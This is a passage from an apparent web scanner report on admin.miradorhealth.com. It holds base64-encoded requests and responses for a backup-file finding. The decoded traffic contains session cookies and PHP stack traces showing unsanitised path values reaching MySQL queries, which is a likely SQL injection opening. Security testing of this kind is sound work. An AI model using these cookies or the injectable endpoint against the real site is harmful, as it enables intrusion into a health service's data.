      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5JTIwLSUyMENvcHklMjAtJTIwQ29weSBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDENCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWthajYxMG0wcnBncXE0YWljc3VtYWdvZjRzOyBzY3JlZW5XaWR0aD0xMzY4OyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WDsgQVdTQUxCQ09SUz1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJQcm9maWxlLzM5OQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNzUNCg0KU2F2ZT1TYXZlJmZpcnN0TmFtZT1ZWVkmbGFzdE5hbWU9Y3lwYXJ0YSZwaG9uZT0wMDAwMDAwMDAwJmVudHJpZXNQZXJQYWdlPTUw]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyOCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNzIzDQpTZXQtQ29va2llOiBBV1NBTEI9d0NqLzR0ZE03L0w5WkNUb0RlUGZobDBSSGN6VjVBVE1remwzV01lY3VIek0vNVR4L1RXbmFja1E2STVtS2FkcFY1K1Y3M1RXOVd6Zk9uZE5QK2xjZHRuVVZiOUFCVjFoMFpXTThINnJHM3ozYitJQ3FvdFE4Ym9PS1pSVzsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjI4IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPXdDai80dGRNNy9MOVpDVG9EZVBmaGwwUkhjelY1QVRNa3psM1dNZWN1SHpNLzVUeC9UV25hY2tRNkk1bUthZHBWNStWNzNUVzlXemZPbmROUCtsY2R0blVWYjlBQlYxaDBaV004SDZyRzN6M2IrSUNxb3RROGJvT0taUlc7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyOCBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogVW5rbm93biBjb2x1bW4gJ0NvcHknIGluICd3aGVyZSBjbGF1c2UnIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJzM5OSAtIENvcHkgLSBDby4uLicpCiMzIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vaW5kZXgucGhwKDEwMyk6IFVzZXJQcm9maWxlQ29udHJvbGxlci0mZ3Q7c2F2ZUVudGl0eSgnMzk5IC0gQ29weSAtIENvLi4uJywgJ1VzZXJQcm9maWxlJywgQXJyYXksIEFycmF5KQojNCB7bWFpbn0KICB0aHJvd24gaW4gPGI+L3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA8L2I+IG9uIGxpbmUgPGI+MjQ8L2I+PGJyIC8+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUva2R1JTIwLSUyMENvcHklMjAtJTIwQ29weSBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDENCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWthajYxMG0wcnBncXE0YWljc3VtYWdvZjRzOyBzY3JlZW5XaWR0aD0xMzY4OyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WDsgQVdTQUxCQ09SUz1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJQcm9maWxlLzM5OQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNzUNCg0KU2F2ZT1TYXZlJmZpcnN0TmFtZT1ZWVkmbGFzdE5hbWU9Y3lwYXJ0YSZwaG9uZT0wMDAwMDAwMDAwJmVudHJpZXNQZXJQYWdlPTUw]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyOCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNzIyDQpTZXQtQ29va2llOiBBV1NBTEI9WWZINmMxVXJ6QS9sMk1kaUNlT3RIN3pIUGY3RmpLUTQ4U1RXMUdJYVpLajhtdHp0OGYzMG1qWU9QNWUzdE41SlJ4VzNNUysrQXhvTlgyVWM5bHRnbTBwMmpmU2VodC81a0ViRTltOUIvcnJiM1hRczJ0UFRkdWVJWlE3cjsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjI4IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPVlmSDZjMVVyekEvbDJNZGlDZU90SDd6SFBmN0ZqS1E0OFNUVzFHSWFaS2o4bXR6dDhmMzBtallPUDVlM3RONUpSeFczTVMrK0F4b05YMlVjOWx0Z20wcDJqZlNlaHQvNWtFYkU5bTlCL3JyYjNYUXMydFBUZHVlSVpRN3I7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyOCBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogVW5rbm93biBjb2x1bW4gJ2tkdScgaW4gJ3doZXJlIGNsYXVzZScgaW4gL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS91dGlsL2RiVXRpbC5waHA6MjQKU3RhY2sgdHJhY2U6CiMwIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwKDI0KTogbXlzcWxpLSZndDtxdWVyeSgnU0VMRUNUICogZnJvbSB1Li4uJykKIzEgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9kYXRhYmFzZS9tb2RlbHMvVXNlci5waHAoMTk0KTogRGJVdGlsOjpnZXRTZWxlY3RSZXN1bHQoT2JqZWN0KG15c3FsaSksICdTRUxFQ1QgKiBmcm9tIHUuLi4nKQojMiAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2NvbnRyb2xsZXIvVXNlclByb2ZpbGVDb250cm9sbGVyLnBocCg5Nik6IFVzZXI6OmdldCgna2R1IC0gQ29weSAtIENvLi4uJykKIzMgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9pbmRleC5waHAoMTAzKTogVXNlclByb2ZpbGVDb250cm9sbGVyLSZndDtzYXZlRW50aXR5KCdrZHUgLSBDb3B5IC0gQ28uLi4nLCAnVXNlclByb2ZpbGUnLCBBcnJheSwgQXJyYXkpCiM0IHttYWlufQogIHRocm93biBpbiA8Yj4vdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocDwvYj4gb24gbGluZSA8Yj4yNDwvYj48YnIgLz4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1508697500885081088</serialNumber>
    <type>6291672</type>
    <name><![CDATA[Backup file]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/UserProfile/399]]></path>
    <location><![CDATA[/UserProfile/3991]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files">Web Security Academy: Information disclosure via backup files</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/530.html">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</a></li><li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li><li><a href="https://capec.mitre.org/data/definitions/204.html">CAPEC-204: Lifting Sensitive Data Embedded in Cache</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvMzk5MSBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDENCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWthajYxMG0wcnBncXE0YWljc3VtYWdvZjRzOyBzY3JlZW5XaWR0aD0xMzY4OyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WDsgQVdTQUxCQ09SUz1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJQcm9maWxlLzM5OQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNzUNCg0KU2F2ZT1TYXZlJmZpcnN0TmFtZT1ZWVkmbGFzdE5hbWU9Y3lwYXJ0YSZwaG9uZT0wMDAwMDAwMDAwJmVudHJpZXNQZXJQYWdlPTUw]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyOSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogODQ0DQpTZXQtQ29va2llOiBBV1NBTEI9ZEhLRElNOHBmY2tZUGJ0U3FjS3pLSkNXdmZZdmtzTXk0RFlDY0s1OFhWUThMNy8vbjd0eXhOSi9rMWRsZ1RWaVBhNmtZZ0JCVmNON1ZxdTU3SElramc2QmZlVU9jRjF6ZXJWTit1UVkxUVdXRnozUlZwdVJoL2ZjeWl3eTsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjI5IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPWRIS0RJTThwZmNrWVBidFNxY0t6S0pDV3ZmWXZrc015NERZQ2NLNThYVlE4TDcvL243dHl4TkovazFkbGdUVmlQYTZrWWdCQlZjTjdWcXU1N0hJa2pnNkJmZVVPY0YxemVyVk4rdVFZMVFXV0Z6M1JWcHVSaC9mY3lpd3k7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyOSBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogWW91IGhhdmUgYW4gZXJyb3IgaW4geW91ciBTUUwgc3ludGF4OyBjaGVjayB0aGUgbWFudWFsIHRoYXQgY29ycmVzcG9uZHMgdG8geW91ciBNeVNRTCBzZXJ2ZXIgdmVyc2lvbiBmb3IgdGhlIHJpZ2h0IHN5bnRheCB0byB1c2UgbmVhciAnLCAwLCAxMCwgJycsIDAsICwgJycsICcyMDI0LTEyLTE0IDIzOjU5OjI5JywgKScgYXQgbGluZSAyIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjMyClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgzMik6IG15c3FsaS0mZ3Q7cXVlcnkoJ2luc2VydCBpbnRvIHVzZS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDQzOSk6IERiVXRpbDo6aW5zZXJ0UmVjb3JkKE9iamVjdChteXNxbGkpLCAnaW5zZXJ0IGludG8gdXNlLi4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoMTI1KTogVXNlci0mZ3Q7c2F2ZSgpCiMzIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvYWRtaW4vaW5kZXgucGhwKDEwMyk6IFVzZXJQcm9maWxlQ29udHJvbGxlci0mZ3Q7c2F2ZUVudGl0eSgnMzk5MScsICdVc2VyUHJvZmlsZScsIEFycmF5LCBBcnJheSkKIzQge21haW59CiAgdGhyb3duIGluIDxiPi92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwPC9iPiBvbiBsaW5lIDxiPjMyPC9iPjxiciAvPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvVXNlclByb2ZpbGUvZXN6MSBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IGFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDENCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANCkNvb2tpZTogUEhQU0VTU0lEPWthajYxMG0wcnBncXE0YWljc3VtYWdvZjRzOyBzY3JlZW5XaWR0aD0xMzY4OyBVc2VyVG90YWxFdmVudHM9aHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyVG90YWxFdmVudHMvP2FqYXg9dHJ1ZTsgc3RhZmZEYXNoYm9hcmRPcmdhbml6YXRpb249dW5kZWZpbmVkOyBzdGFmZkRhc2hib2FyZERhdGVSYW5nZT1Nb250aGx5OyBBV1NBTEI9QnNERFluNkk3S2htUGlpUmxHM1VFS0czS1F5bndUSG54Tm4wVzdwYitNbFQyZTlsTXJ0REtpZldwZFBRd1dvUlpvaHMzcVFJV3dVL2NMeDhLdjBGUG1FdmlaemZnVnF3bm1CdkRSUUwyd2hEcVFvdDlZd1NLZVNJV2E5WDsgQVdTQUxCQ09SUz1Cc0REWW42STdLaG1QaWlSbEczVUVLRzNLUXlud1RIbnhObjBXN3BiK01sVDJlOWxNcnRES2lmV3BkUFF3V29SWm9oczNxUUlXd1UvY0x4OEt2MEZQbUV2aVp6ZmdWcXdubUJ2RFJRTDJ3aERxUW90OVl3U0tlU0lXYTlYDQpPcmlnaW46IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20NClgtUmVxdWVzdGVkLVdpdGg6IFhNTEh0dHBSZXF1ZXN0DQpSZWZlcmVyOiBodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL1VzZXJQcm9maWxlLzM5OQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgNClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQpDb250ZW50LUxlbmd0aDogNzUNCg0KU2F2ZT1TYXZlJmZpcnN0TmFtZT1ZWVkmbGFzdE5hbWU9Y3lwYXJ0YSZwaG9uZT0wMDAwMDAwMDAwJmVudHJpZXNQZXJQYWdlPTUw]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo1OToyOSBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNjk1DQpTZXQtQ29va2llOiBBV1NBTEI9QlU4UVBjNW9xczN5QkZpMk16RDUwejFFcVVML2Ryd3VsL3FzUzFTM3hKdWlndytCZWpYa3N0S3dwQjlxRTV5S3JNNW92M0wvam85WDAybUpWcjJRVXk3UC96UWZKN0svMEE5NXlaclpPZzQxbkpSOGFWOUxDV1VXQ29mTDsgRXhwaXJlcz1TYXQsIDIxIERlYyAyMDI0IDIzOjU5OjI5IEdNVDsgUGF0aD0vDQpTZXQtQ29va2llOiBBV1NBTEJDT1JTPUJVOFFQYzVvcXMzeUJGaTJNekQ1MHoxRXFVTC9kcnd1bC9xc1MxUzN4SnVpZ3crQmVqWGtzdEt3cEI5cUU1eUtyTTVvdjNML2pvOVgwMm1KVnIyUVV5N1AvelFmSjdLLzBBOTV5WnJaT2c0MW5KUjhhVjlMQ1dVV0NvZkw7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo1OToyOSBHTVQ7IFBhdGg9LzsgU2FtZVNpdGU9Tm9uZTsgU2VjdXJlDQpTZXJ2ZXI6IEFwYWNoZS8yLjQuNTIgKCkgUEhQLzguMi45DQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuOQ0KRXhwaXJlczogVGh1LCAxOSBOb3YgMTk4MSAwODo1MjowMCBHTVQNCkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlDQpQcmFnbWE6IG5vLWNhY2hlDQoNCjxiciAvPgo8Yj5GYXRhbCBlcnJvcjwvYj46ICBVbmNhdWdodCBteXNxbGlfc3FsX2V4Y2VwdGlvbjogVW5rbm93biBjb2x1bW4gJ2VzejEnIGluICd3aGVyZSBjbGF1c2UnIGluIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvdXRpbC9kYlV0aWwucGhwOjI0ClN0YWNrIHRyYWNlOgojMCAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocCgyNCk6IG15c3FsaS0mZ3Q7cXVlcnkoJ1NFTEVDVCAqIGZyb20gdS4uLicpCiMxIC92YXIvd3d3L2h0bWwvaW5zaWdodHMvZGF0YWJhc2UvbW9kZWxzL1VzZXIucGhwKDE5NCk6IERiVXRpbDo6Z2V0U2VsZWN0UmVzdWx0KE9iamVjdChteXNxbGkpLCAnU0VMRUNUICogZnJvbSB1Li4uJykKIzIgL3Zhci93d3cvaHRtbC9pbnNpZ2h0cy9hZG1pbi9jb250cm9sbGVyL1VzZXJQcm9maWxlQ29udHJvbGxlci5waHAoOTYpOiBVc2VyOjpnZXQoJ2VzejEnKQojMyAvdmFyL3d3dy9odG1sL2luc2lnaHRzL2FkbWluL2luZGV4LnBocCgxMDMpOiBVc2VyUHJvZmlsZUNvbnRyb2xsZXItJmd0O3NhdmVFbnRpdHkoJ2VzejEnLCAnVXNlclByb2ZpbGUnLCBBcnJheSwgQXJyYXkpCiM0IHttYWlufQogIHRocm93biBpbiA8Yj4vdmFyL3d3dy9odG1sL2luc2lnaHRzL2RhdGFiYXNlL3V0aWwvZGJVdGlsLnBocDwvYj4gb24gbGluZSA8Yj4yNDwvYj48YnIgLz4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8828748157370104832</serialNumber>
